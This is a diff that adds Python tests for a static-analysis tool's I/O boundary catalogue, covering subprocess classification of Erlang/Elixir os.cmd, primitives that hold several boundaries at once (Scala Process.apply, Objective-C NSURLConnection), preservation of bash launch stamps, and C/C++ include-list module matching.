+        """
+        cat = load_catalog("erlang")
+        got = cat.lookup_with_module("erlang.open_port", "erlang")
+        assert got is not None, "erlang:open_port/2 was catalogued nowhere"
+        assert got.boundary == "subprocess"
+
+    def test_elixir_inherits_the_fix_rather_than_repeating_it(self) -> None:
+        """PARITY over the BEAM family, and the reason this is ONE catalogue
+        edit and not two.
+
+        Elixir carries its own ``subprocess`` section for ``System.cmd`` /
+        ``Port.open`` and does NOT declare ``os.cmd`` — yet a census measured it
+        resolving ``os.cmd`` to ``env_read`` exactly as Erlang did, because
+        elixir inherits the erlang catalogue (the same child-over-parent
+        mechanism scala uses for java). An Elixir program calling ``:os.cmd/1``,
+        which is idiomatic BEAM interop, sat in precisely the state the item
+        described for Erlang.
+
+        This test is what keeps the two languages from drifting: it asserts the
+        inherited answer, so a future edit that fixes only the child leaves the
+        parent's defect visible here.
+        """
+        got = load_catalog("elixir").lookup_with_module("os.cmd", "os")
+        assert got is not None
+        assert got.boundary == "subprocess", (
+            f"elixir inherits erlang's os module; :os.cmd/1 must be a launch "
+            f"there too. Got {got.boundary!r}"
+        )
+
+    def test_the_shell_out_is_marked_high_risk(self) -> None:
+        """``subprocess`` is flagged ``*** HIGH RISK ***`` on the invariant that
+        launching an external program is arbitrary code execution. Losing the
+        boundary lost the marking too, so re-keying without this would fix the
+        chain and leave the warning missing.
+        """
+        assert is_high_risk("os.cmd")
+        assert is_high_risk("erlang.open_port")
+
+    def test_cmd_is_no_longer_reachable_as_an_env_boundary(self) -> None:
+        """THE HALF A RE-KEY CAN SILENTLY SKIP. Adding a ``subprocess`` row while
+        leaving the ``env_read`` / ``env_write`` rows in place would make
+        ``os.cmd`` a MULTI-BOUNDARY primitive, and INV-zumin measured what
+        happens then: ``lookup_with_module`` returns one row decided by YAML
+        order, so the fix would be live or inert depending on where it was
+        pasted. The env rows are REMOVED, not supplemented.
+        """
+        for lang in ("erlang", "elixir"):
+            boundaries = {
+                p.boundary for p in load_catalog(lang).primitives
+                if p.qualified_name == "os.cmd"
+            }
+            assert boundaries == {"subprocess"}, (
+                f"{lang}: os.cmd must be declared under subprocess ALONE, or "
+                f"row order decides which declaration survives (INV-zumin). "
+                f"Got {sorted(boundaries)}"
+            )
+
+
+class TestSimultaneouslyTrueBoundariesAreAllReachable:
+    """INV-zumin. A primitive catalogued under several boundaries is tagged with
+    exactly ONE, decided by YAML row order, so every other declaration is
+    unreachable.
+
+    THE POPULATION IS NOT ONE THING, and the fix is scoped to the one part of it
+    that is a defect. Measured across all fourteen shipped catalogues with
+    production's own ``load_catalog`` / ``lookup_with_module`` — 23
+    multi-boundary primitives, 27 unreachable declarations:
+
+      (a) DISAMBIGUATED AT MATCH TIME — ``builtins.open`` picks by ``io_mode``.
+          Working as designed; untouched here.
+      (b) UNDECIDABLE AT THE CALL SITE — C ``unistd.write`` is fs_write OR
+          net_send OR ipc_send depending on the fd's type, which is not at the
+          call site. EXACTLY ONE is true per call. Untouched deliberately:
+          multiplying these would manufacture a ``net_send`` chain for every C
+          write to stdout, which is a false violation rather than a recovered
+          one. The honest fix there is fd-type inference (its own item).
+      (c) SIMULTANEOUSLY TRUE — both rows describe the same call at the same
+          moment, so there is nothing to disambiguate and row order silently
+          discards one. THIS is the defect.
+
+    The (b)/(c) split is NOT derivable from the YAML — both look like "several
+    rows, no mode" — so the catalogue has to say which. That is why this ships
+    as a data marker consumed at one chokepoint rather than as a change to
+    ``select_by_mode``'s fallback, which could only swap WHICH declaration is
+    silently lost.
+
+    WHY (c) IS SECURITY-RELEVANT. ``scala.sys.process.Process.apply`` is
+    declared ``[fs_write, subprocess]`` and tags ``fs_write``. Losing
+    ``subprocess`` loses four things at once, none of which the fs_write tag
+    replaces: a ``{boundary: subprocess, must_not_exist: true}`` claim finds no
+    chain; the ``*** HIGH RISK ***`` marking never fires; the auto-derived taint
+    sink gets zone ``host_fs`` instead of ``subprocess``, so a "subprocess
+    allowed, host_fs prohibited" claim INVERTS; and the opacity gate keys on the
+    boundary. The rows' own notes show the author knew both were true — the
+    fs_write row says "can write to filesystem via shell commands", which is a
+    statement about what the LAUNCHED PROGRAM does.
+    """
+
+    def test_scala_process_apply_reaches_both_declarations(self) -> None:
+        cat = load_catalog("scala")
+        got = cat.all_boundaries_for("scala.sys.process.Process.apply")
+        assert got == {"fs_write", "subprocess"}, (
+            f"both declarations are true of the same call; row order must not "
+            f"discard one. Got {sorted(got)}"
+        )
+
+    def test_single_boundary_primitives_are_unchanged(self) -> None:
+        """NON-DESTRUCTION, and the reason this is safe to ship: the
+        overwhelming majority of primitives are not multi-boundary and must not
+        pay for this.
+        """
+        cat = load_catalog("python")
+        assert cat.all_boundaries_for("os.listdir") == {"fs_read"}
+        assert cat.all_boundaries_for("subprocess.run") == {"subprocess"}
+
+    def test_an_uncatalogued_name_returns_empty_not_none(self) -> None:
+        """``None`` and "no boundaries" are different facts everywhere else in
+        this module (L54 default-deny); an empty set here means "asked, nothing
+        declared".
+        """
+        assert load_catalog("python").all_boundaries_for("nope.nothing") == set()
+
+    def test_mode_disambiguated_pairs_are_not_treated_as_simultaneous(
+        self,
+    ) -> None:
+        """CLASS (a) STAYS OUT. ``builtins.open`` is fs_read OR fs_write by
+        mode — never both at once — so it must not be reported as
+        simultaneously true, or every ``open(p)`` would produce a spurious
+        fs_write chain and an "never writes to disk" claim would go from a
+        possibly-correct confirm to a certainly-wrong violation.
+        """
+        assert load_catalog("python").simultaneous_boundaries_for(
+            "builtins.open",
+        ) == set()
+
+    def test_call_site_undecidable_pairs_are_not_treated_as_simultaneous(
+        self,
+    ) -> None:
+        """CLASS (b) STAYS OUT, for the same reason in the other direction.
+        ``unistd.write`` on a socket fd is net_send and NOT fs_write; on a file
+        fd it is fs_write and NOT net_send. Reporting both would assert two
+        things when exactly one is true.
+        """
+        assert load_catalog("c").simultaneous_boundaries_for(
+            "unistd.write",
+        ) == set()
+
+    def test_declaring_simultaneous_on_one_row_alone_is_rejected(self) -> None:
+        """A HALF-DECLARED PAIR IS THE DRIFT THIS INVITES. ``simultaneous`` is a
+        property of a PRIMITIVE, spelled on rows that live in different YAML
+        sections by construction, so the loader must refuse a primitive whose
+        rows disagree rather than silently pick one — a marker that is live or
+        inert depending on which section a later editor updates is exactly the
+        row-order hazard this item exists to remove.
+        """
+        cat = IoBoundaryCatalog(language="x", primitives=[
+            IoPrimitive(boundary="fs_write", module="m", name="f",
+                        kind="method", simultaneous=True),
+            IoPrimitive(boundary="subprocess", module="m", name="f",
+                        kind="method", simultaneous=False),
+        ])
+        with pytest.raises(ValueError, match="simultaneous"):
+            cat.simultaneous_boundaries_for("m.f")
+
+
+class TestASimultaneousPrimitiveProducesAChainPerBoundary:
+    """INV-zumin, the half that changes a VERDICT rather than an accessor.
+
+    Reaching both declarations in the catalogue is necessary and not
+    sufficient: chains are what a ``must_not_exist`` claim counts, and they are
+    built from ``edge.meta['io_boundary']`` — one string. So a
+    simultaneously-true primitive still produced exactly one chain, and the
+    scala launch stayed undetectable as a subprocess no matter what the
+    catalogue said.
+    """
+
+    @staticmethod
+    def _edge(src: str, dst: str, meta=None):
+        """Same MockEdge shape the rest of this module's tagger tests use —
+        ``tag_io_boundaries`` reads src/dst/edge_type/meta via getattr."""
+        from dataclasses import dataclass, field
+        from typing import Any, Dict, Optional
+
+        @dataclass
+        class MockEdge:
+            src: str
+            dst: str
+            edge_type: str = "calls"
+            meta: Optional[Dict[str, Any]] = None
+
+        return MockEdge(src=src, dst=dst, meta=meta)
+
+    def _scala_edge(self):
+        return self._edge(
+            src="scala:App.scala:1-9:run:function",
+            dst="scala:scala.sys.process.Process:0-0:apply:external_symbol",
+            meta={"call_construct": "method"},
+        )
+
+    def test_both_boundaries_are_stamped_on_the_edge(self) -> None:
+        edges = [self._scala_edge()]
+        tag_io_boundaries(edges, {"scala": load_catalog("scala")})
+        meta = edges[0].meta or {}
+        assert set(meta.get("io_boundaries") or []) == {"fs_write", "subprocess"}
+
+    def test_the_primary_io_boundary_key_is_unchanged_for_consumers(
+        self,
+    ) -> None:
+        """BACK-COMPAT, deliberate. ``io_boundary`` stays a single string and
+        keeps its existing value: everything that reads it — the F3 gate, the
+        taint sink derivation, ``declares_opaque_crossing``, third-party
+        consumers of the JSON — keeps working unchanged. The new key is
+        ADDITIVE, so this cannot regress a consumer that never learns about it.
+        """
+        edges = [self._scala_edge()]
+        tag_io_boundaries(edges, {"scala": load_catalog("scala")})
+        assert (edges[0].meta or {}).get("io_boundary") == "fs_write"
+
+    def test_a_single_boundary_primitive_gets_no_list(self) -> None:
+        """NON-DESTRUCTION for the ~99% of primitives that are not
+        multi-boundary: no new key, no extra chain, no cost.
+        """
+        edges = [self._edge(
+            src="python:a.py:1-3:f:function",
+            dst="python:os:0-0:listdir:external_symbol",
+        )]
+        tag_io_boundaries(edges, {"python": load_catalog("python")})
+        meta = edges[0].meta or {}
+        assert meta.get("io_boundary") == "fs_read"
+        assert "io_boundaries" not in meta
+
+    def test_the_subprocess_chain_now_exists(self) -> None:
+        """THE POINT. A ``{boundary: subprocess, must_not_exist: true}`` claim
+        counts chains; before this it found none for a scala process launch,
+        because the fs_write row won on row order.
+        """
+        bmap = compute_boundary_map(
+            [self._scala_edge()], {"scala": load_catalog("scala")},
+        )
+        assert len(bmap.entries["subprocess"].chains) == 1
+        assert len(bmap.entries["fs_write"].chains) == 1
+
+    def test_the_launch_is_marked_high_risk(self) -> None:
+        """Losing ``subprocess`` also lost the ``*** HIGH RISK ***`` marking,
+        which exists on the invariant that launching an external program is
+        arbitrary code execution. Recovering the chain must recover the marking
+        with it, or the fix is half done in the direction that matters least.
+        """
+        bmap = compute_boundary_map(
+            [self._scala_edge()], {"scala": load_catalog("scala")},
+        )
+        assert bmap.entries["subprocess"].to_dict()["has_high_risk"] is True
+
+
+class TestSimultaneityGeneralisesPastOneLanguage:
+    """TWO LANGUAGES, because a fix verified on one is not verified for another
+    — this repo's standing rule, earned twice.
+
+    scala's ``Process.apply`` and objc's ``NSURLConnection`` request methods are
+    the same defect in different clothes: both declare two boundaries that are
+    true of one call at one moment, and both lost one to YAML row order. They
+    fail on DIFFERENT boundary pairs (fs_write+subprocess vs net_send+net_recv)
+    and in different directions of consequence, which is what makes the second
+    one a generalisation test rather than a second sample.
+
+    objc is also the case that shaped the mechanism: its ``net_send`` row groups
+    the two genuinely-dual request methods WITH
+    ``connectionWithRequest:delegate:``, which the ``net_recv`` row does not
+    carry. The flag is per-row, so a row-granular reading would have made that
+    third method "simultaneous" with a single boundary.
+    """
+
+    def test_objc_request_reaches_both_directions(self) -> None:
+        """The objc rows ALREADY SAID SO in prose — "request implies both send
+        and receive" — and nothing consumed it. Same shape as ``builtins.open``
+        before WI-rusof: a rule documented in ``notes:`` and unimplemented.
+        """
+        cat = load_catalog("objc")
+        got = cat.simultaneous_boundaries_for(
+            "NSURLConnection.sendSynchronousRequest:returningResponse:error:",
+        )
+        assert got == {"net_send", "net_recv"}
+
+    def test_the_send_only_constructors_stay_single_boundary(self) -> None:
+        """``connectionWithRequest:delegate:`` is declared under ``net_send``
+        alone, so it keeps its single chain.
+
+        NAMED FOR WHY IT PASSES NOW, not for why it passed when written. The
+        first version of this test was called
+        ``test_a_flagged_row_with_one_boundary_is_not_simultaneous`` and
+        asserted the runtime guard below — true at the time, because the
+        flagged ``net_send`` row grouped these constructors with the two
+        genuinely-dual request methods. The parity test rejected that grouping
+        and the row was split, so this method now reaches the same empty result
+        one branch earlier (its rows simply do not carry the flag). Leaving the
+        old name would have described a code path this test no longer touches —
+        the shape where a docstring is corrected and the assertion silently
+        means something else.
+        """
+        cat = load_catalog("objc")
+        assert cat.simultaneous_boundaries_for(
+            "NSURLConnection.connectionWithRequest:delegate:",
+        ) == set()
+
+    def test_an_uncatalogued_name_has_no_simultaneous_boundaries(self) -> None:
+        """Asked about a primitive the catalogue does not carry: empty, not a
+        raise and not ``None``. The sibling assertion for
+        ``all_boundaries_for`` does not exercise this method's own early exit.
+        """
+        assert load_catalog("python").simultaneous_boundaries_for(
+            "nope.nothing",
+        ) == set()
+
+    def test_a_flagged_single_boundary_primitive_yields_nothing(self) -> None:
+        """THE RUNTIME GUARD, which no SHIPPED catalogue reaches today and which
+        is kept because the flag is spelled per ROW and rows legitimately group
+        methods that differ in this respect — the exact objc shape that existed
+        until the parity test forced the split.
+
+        Built from a synthetic catalogue rather than a real one precisely
+        BECAUSE the shipped data no longer produces it: asserting it through
+        ``load_catalog`` would make the test pass for the wrong reason the
+        moment a catalogue changed underneath it.
+        """
+        cat = IoBoundaryCatalog(language="x", primitives=[
+            IoPrimitive(boundary="net_send", module="m", name="only",
+                        kind="method", simultaneous=True),
+        ])
+        assert cat.simultaneous_boundaries_for("m.only") == set()
+
+    def test_every_simultaneous_primitive_declares_at_least_two_boundaries(
+        self,
+    ) -> None:
+        """PARITY over every shipped catalogue, so the NEXT primitive marked
+        simultaneous is checked rather than trusted.
+
+        A flag that yields one boundary is inert — it neither helps nor harms —
+        but it is also a sign the author meant something the data does not say,
+        and inert-looking declarations are how a catalogue drifts into asserting
+        nothing. This enumerates rather than spot-checks, which is the same
+        reason the HIGH_RISK drift guard enumerates.
+        """
+        offenders: list[tuple[str, str]] = []
+        for lang in CATALOG_LANGUAGES:
+            cat = load_catalog(lang)
+            flagged = {
+                p.qualified_name for p in cat.primitives if p.simultaneous
+            }
+            for q in sorted(flagged):
+                if len(cat.all_boundaries_for(q)) < 2:
+                    offenders.append((lang, q))
+        assert not offenders, (
+            f"`simultaneous: true` declared on a primitive with fewer than two "
+            f"boundaries — the flag says 'these boundaries are all true at "
+            f"once' and there is only one: {offenders}"
+        )
+
+    def test_no_catalogue_has_a_half_declared_simultaneous_pair(self) -> None:
+        """PARITY, the other direction. ``simultaneous`` is a property of a
+        PRIMITIVE spelled on rows that live in different YAML sections by
+        construction, so a live-shipped half-declared pair would make the marker
+        live or inert depending on which section was edited last — the row-order
+        dependence this whole mechanism removes, reintroduced.
+
+        ``simultaneous_boundaries_for`` raises on that; this asserts no SHIPPED
+        catalogue is in the state today.
+        """
+        for lang in CATALOG_LANGUAGES:
+            cat = load_catalog(lang)
+            for q in {p.qualified_name for p in cat.primitives}:
+                cat.simultaneous_boundaries_for(q)  # raises if half-declared
+
+
+class TestAProducerStampSurvivesCatalogueTagging:
+    """INV-virat — the one-slot last-writer-wins class, third instance.
+
+    ``command_launch`` is the bash analyzer's opacity stamp: "control left this
+    process for a program I cannot see" (bash.py:534). It is the ONLY evidence
+    of opacity those edges will ever carry, because ADR-0016 rules out a bash
+    catalogue. ``tag_io_boundaries`` assigned ``meta['io_boundary']``
+    unconditionally, so any catalogue row that matched a producer-stamped edge
+    DESTROYED the stamp:
+
+        before: {'io_boundary': 'command_launch'}
+        after:  {'io_boundary': 'fs_read', 'io_primitive': 'os.listdir'}
+
+    The shipped opacity gate did not fail end-to-end only because it reads
+    ``raw_edges`` — the serialized dicts — while the tagger mutates objects
+    whose meta ``_rehydrate_io_boundary_edges`` happens to SHALLOW-COPY for an
+    unrelated reason (WI-kumol). Read order plus an accidental copy is not a
+    safety property; a future refactor that shares the meta dict to save an
+    allocation would silently restore the false confirm, and every test would
+    stay green because none constructs edges through rehydration.
+
+    THE FIX IS THE INV-zumin MECHANISM WITH A SECOND WRITER. A launch that a
+    catalogue row also describes is two facts true at once — ``curl -o ...``
+    IS a net_send AND an opaque launch — which is exactly the shape
+    ``io_boundaries`` was built for; the second writer here is an ANALYZER
+    rather than another row. The stamp stays primary (the analyzer SAW the
+    launch; the catalogue merely ASSERTS the send — different trust), and the
+    catalogue view lands additively.
+    """
+
+    @staticmethod
+    def _edge(meta=None):
+        from dataclasses import dataclass
+        from typing import Any, Dict, Optional
+
+        @dataclass
+        class MockEdge:
+            src: str
+            dst: str
+            edge_type: str = "calls"
+            meta: Optional[Dict[str, Any]] = None
+
+        return MockEdge(
+            src="python:a.py:1-3:f:function",
+            dst="python:os:0-0:listdir:external_symbol",
+            meta=meta,
+        )
+
+    def test_the_stamp_is_not_erased_by_a_matching_row(self) -> None:
+        e = self._edge(meta={"io_boundary": "command_launch"})
+        tag_io_boundaries([e], {"python": load_catalog("python")})
+        assert e.meta["io_boundary"] == "command_launch", (
+            f"the producer's opacity observation must outrank the catalogue's "
+            f"assertion; got {e.meta!r}"
+        )
+
+    def test_the_catalogue_view_is_recorded_additively(self) -> None:
+        """The row is not WRONG — os.listdir really is fs_read — so its fact
+        must not be discarded either. Both land in ``io_boundaries``.
+        """
+        e = self._edge(meta={"io_boundary": "command_launch"})
+        tag_io_boundaries([e], {"python": load_catalog("python")})
+        assert set(e.meta.get("io_boundaries") or []) == {
+            "command_launch", "fs_read",
+        }
+        assert e.meta.get("io_primitive") == "os.listdir"
+
+    def test_an_unstamped_edge_tags_exactly_as_before(self) -> None:
+        """NON-DESTRUCTION for the entire rest of the corpus: no producer
+        stamp means the previous overwrite semantics, no new key."""
+        e = self._edge(meta=None)
+        tag_io_boundaries([e], {"python": load_catalog("python")})
+        assert e.meta["io_boundary"] == "fs_read"
+        assert "io_boundaries" not in e.meta
+
+    def test_a_stamped_edge_no_row_matches_is_untouched(self) -> None:
+        """A launch nothing describes keeps its stamp and gains nothing —
+        today's bash reality (no catalogue, overlays inert per WI-guhuv)."""
+        e = self._edge(meta={"io_boundary": "command_launch"})
+        e.dst = "python:nowhere:0-0:nothing:external_symbol"
+        tag_io_boundaries([e], {"python": load_catalog("python")})
+        assert e.meta == {"io_boundary": "command_launch"}
+
+    def test_chain_accounting_discloses_the_launch_and_counts_the_io(
+        self,
+    ) -> None:
+        """Both facts reach the map, each under its own accounting rule: the
+        launch chain is DISCLOSED (command_launch_edges) and excluded from the
+        ``total_io_edges`` headline, exactly as bash launches are today; the
+        catalogue-boundary chain is counted. One edge, two chains, no
+        double-count in the total.
+        """
+        e = self._edge(meta={"io_boundary": "command_launch"})
+        bmap = compute_boundary_map([e], {"python": load_catalog("python")})
+        assert len(bmap.entries["command_launch"].chains) == 1
+        assert len(bmap.entries["fs_read"].chains) == 1
+        assert bmap.command_launch_edges == 1
+        assert bmap.total_io_edges == 1, (
+            "the launch chain is disclosed-only and must not inflate the "
+            "verified-I/O headline"
+        )
+
+    def test_the_gate_reads_the_stamp_off_the_tagged_object(self) -> None:
+        """THE STRUCTURAL PROPERTY, asserted without the accidental copy in
+        between: after tagging, the very same meta dict still satisfies the
+        opacity gate's producer check. Before the fix this exact assertion
+        failed — the stamp was gone from the only place the gate looks.
+        """
+        e = self._edge(meta={"io_boundary": "command_launch"})
+        tag_io_boundaries([e], {"python": load_catalog("python")})
+        from hypergumbo_core.io_boundary import PRODUCER_OPAQUE_BOUNDARIES
+        assert e.meta.get("io_boundary") in PRODUCER_OPAQUE_BOUNDARIES
+
+
+class TestCppMultiIncludeModuleSlot:
+    """INV-funuf: a C/C++ module slot is a DISJUNCTION, not one module name.
+
+    ``cpp.py`` pre-collects every ``#include <...>`` in a file and sets an
+    unresolved call's module slot to the comma-joined list of all of them:
+
+        cpp:stdio.h,vector,string:0-0:fopen:unresolved
+
+    Its own comment states the intended contract — "the semantics is 'this call
+    could be from any of the included headers'; downstream consumers may split
+    the module_hint on commas". No consumer ever did. ``lookup_with_module``
+    handed the whole joined string to ``_module_matches``, which is EXACT by
+    design (a prefix rule was wrong in three languages at once), so a
+    multi-include file matched nothing at all. A SINGLE-include file missed too,
+    because the slot keeps the header FILENAME while ``c.yaml`` declares the
+    header STEM.
+
+    Measured on whisper.cpp (real repo, production extractors, call edges
+    only): 6 of 35,059 matched. The 59 recovered here are the security surface
+    — getenv, fork/execvp/waitpid, socket/bind/connect/listen/send/recv — so
+    C++'s entire network, subprocess and env-read surface was invisible to
+    io-boundaries and to every taint source derived from it.
+    """
+
+    def test_a_single_header_filename_reaches_its_catalogue_stem(self) -> None:
+        catalog = load_catalog("c")
+        assert catalog.lookup_with_module("fopen", "stdio") is not None, (
+            "precondition: the catalogue declares the STEM"
+        )
+        hit = catalog.lookup_with_module("fopen", "stdio.h")
+        assert hit is not None, "'stdio.h' must reach the 'stdio' entry"
+        assert hit.module == "stdio"
+
+    def test_a_comma_joined_slot_is_tried_part_by_part(self) -> None:
+        catalog = load_catalog("c")
+        hit = catalog.lookup_with_module("fopen", "stdio.h,vector,string")
+        assert hit is not None, (
+            "a multi-include file must still reach the catalogue; the joined "
+            "slot means 'any of these headers', not one module named "
+            "'stdio.h,vector,string'"
+        )
+        assert hit.module == "stdio"
+
+    def test_the_security_surface_is_reachable(self) -> None:
+        """getenv is a taint SOURCE, not merely a boundary — it was the single
+        highest-count miss in the measured population."""
+        catalog = load_catalog("c")
+        hint = "algorithm,stdlib.h,vector,cstdio,unistd.h,sys/socket.h"
+        for name, module in (("getenv", "stdlib"),
+                             ("socket", "sys/socket"),
+                             ("fork", "unistd")):
+            hit = catalog.lookup_with_module(name, hint)
+            assert hit is not None, f"{name} unreachable from {hint!r}"
+            assert hit.module == module
+
+    def test_a_header_not_included_does_not_match(self) -> None:
+        """The disjunction is bounded by what the file actually includes.
+
+        This is the whole false-positive guard: a file that never includes
+        <sys/socket.h> must not match sys/socket entries no matter how
+        suggestive the call name is. Without it, splitting would hand every
+        short name a match from any catalogue module.
+        """
+        catalog = load_catalog("c")
+        hint = "vector,string,map,algorithm"
+        assert catalog.lookup_with_module("socket", hint) is None
+        assert catalog.lookup_with_module("fopen", hint) is None
+
+    def test_a_single_module_hint_is_unchanged(self) -> None:
+        """Languages that emit ONE module per slot must be byte-identical.
+
+        The expansion is additive: it adds candidate spellings, it never
+        widens what a single non-header hint may match.
+        """
+        py = load_catalog("python")
+        assert py.lookup_with_module("read", "external") is None
+        assert py.lookup_with_module("listdir", "os") is not None
+        # A wrong single hint stays wrong — no part-splitting rescues it.
+        assert py.lookup_with_module("listdir", "shutil") is None
+
+    def test_expansion_is_a_no_op_for_every_other_hint_shape(self) -> None:
+        """NON-DESTRUCTION, asserted rather than argued (L6).
+
+        A hint with no comma and no header suffix must expand to exactly
+        itself, so every language that emits one module per slot is provably
+        unaffected. Swept: ``cpp.py:1374`` is the ONLY producer in the tree
+        that comma-joins a module slot, and NO shipped catalogue declares a
+        module ending in a header suffix — so the stem candidate can add a
+        match but can never remove or redirect one.
+        """
+        from hypergumbo_core.io_boundary import _module_hint_candidates
+        for hint in ("os", "net/http", "std::fs", "java.io", "pathlib.Path",
+                     "sys", "os.exec.Cmd", "crypto/rand"):
+            assert _module_hint_candidates(hint) == [hint], (
+                f"{hint!r} must expand to itself alone"
+            )
+
+    def test_the_whole_slot_is_offered_before_any_part(self) -> None:
+        """Order is load-bearing: an exact whole-slot match must still win, so
+        the expansion can only ever be consulted after today's answer fails."""
+        from hypergumbo_core.io_boundary import _module_hint_candidates
+        assert _module_hint_candidates("stdio.h,vector")[0] == "stdio.h,vector"
+        assert _module_hint_candidates("stdio.h") == ["stdio.h", "stdio"]
+
+    def test_blank_and_duplicate_parts_do_not_multiply_candidates(self) -> None:
+        from hypergumbo_core.io_boundary import _module_hint_candidates
+        assert _module_hint_candidates("stdio.h,,stdio.h, ") == [
+            "stdio.h,,stdio.h, ", "stdio.h", "stdio",
+        ]
